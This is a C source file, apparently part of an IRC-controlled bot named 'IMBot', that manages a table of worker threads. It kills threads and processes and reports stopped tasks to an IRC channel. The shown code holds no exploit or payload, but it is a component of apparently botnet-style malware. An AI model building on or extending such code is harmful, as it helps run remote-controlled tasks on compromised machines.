/*
 ___    _____  __________          __ 
|   |  /     \ \______   \  ____ _/  |_
|   | /  \ /  \ |    |  _/ /  _ \\   __\
|   |/    Y    \|    |   \(  <_> )|  |
|___|\____|__  /|______  / \____/ |__|
             \/        \/ 
*/
#include "../h/includes.h"
#include "../h/functions.h"

THREAD threads[MAX_THREADS];

// function to add description to thread list and return thread number
int addthread(int id, char *name,...)
{
	char tbuffer[(IRCLINE-(MAX_NICKLEN+10))];
	va_list argp;
	va_start(argp,name); 
	_vsnprintf(tbuffer,sizeof(tbuffer),name,argp);
	int i;
	for (i = 0; i < MAX_THREADS; i++) {
		if (threads[i].name[0] == '\0') {
			strncpy(threads[i].name, tbuffer, sizeof(threads[i].name)-1);
			threads[i].id=id;
			threads[i].parent=0;
			threads[i].pid=0;
			break;
		}
	}
	return i;
}
BOOL killthread(int threadnum)
{
	BOOL threadkilled = FALSE;
	if ((threadnum>0) && (threadnum<MAX_THREADS))
	{
		TerminateThread(threads[threadnum].tHandle, 0);
		if (threads[threadnum].tHandle != 0) 
			threadkilled = TRUE;
		threads[threadnum].tHandle = 0;
		threads[threadnum].id = 0;
		threads[threadnum].parent = 0;
		threads[threadnum].pid = 0; 
		threads[threadnum].name[0] = '\0';
		fclosesocket(threads[threadnum].csock);
		threads[threadnum].csock = 0;
	}
	return threadkilled;
}
int killthreadall(void)
{
	int numthreads=0;
	for (int i = 0; i < MAX_THREADS; i++)
		if (threads[i].name[0] != '\0')
			if (killthread(i))
				numthreads++;
	return numthreads;
}
int killthreadid(int threadid, int threadnum)
{
	int numthreads=0;
	for (int i=0;i<MAX_THREADS;i++)
	{
		if (threads[i].id == threadid)
		{
			if (threadnum > 0)
			{
				if (threads[i].parent == threadnum || i == threadnum)
					if (killthread(i)) 
						numthreads++;
			}
			else 
			{
				if (killthread(i)) 
					numthreads++;
			}
		}
	}
	return numthreads;
}
void clearthread(int threadnum)
{
	threads[threadnum].tHandle = 0;
	threads[threadnum].id=0;
	threads[threadnum].parent=0;
	threads[threadnum].pid=0;
	threads[threadnum].csock=0;
	threads[threadnum].name[0]='\0';
	return;
}
void stopthread(char *target, void* conn, BOOL silent, BOOL verbose, char *thread, int threadid, char *desc)
{
	IRC* irc=(IRC*)conn;
	int threadnum=0, i;
	if(thread)
		threadnum=atoi(thread);
	if ((i=killthreadid(threadid,threadnum)) > 0)
	{
		if (!silent)
			irc->pmsg(target,"%s %s thread stopped. (%d thread(s) stopped.)", threads_title, desc, i);
	}
	else
	{
		if (!silent && verbose)
			irc->pmsg(target,"%s No %s thread found.", threads_title, desc);
	}
	return;
}
int findthreadnum(int threadid)
{
	int threadnum=0;
	for (int i=0;i<MAX_THREADS;i++)
		if (threads[i].id == threadid)
		{
			threadnum=i;
			break;
		}

	return threadnum;
}
BOOL KillPid(unsigned long lPid)
{
	bool bRetVal=FALSE;
	TOKEN_PRIVILEGES tPrivOld;
	HANDLE hToken;
	HANDLE hProcess=OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ|PROCESS_TERMINATE,FALSE,lPid);
	if(hProcess) {
		TerminateProcess(hProcess, 0);
		bRetVal=TRUE;
		CloseHandle(hProcess);
	}
	return bRetVal;
}
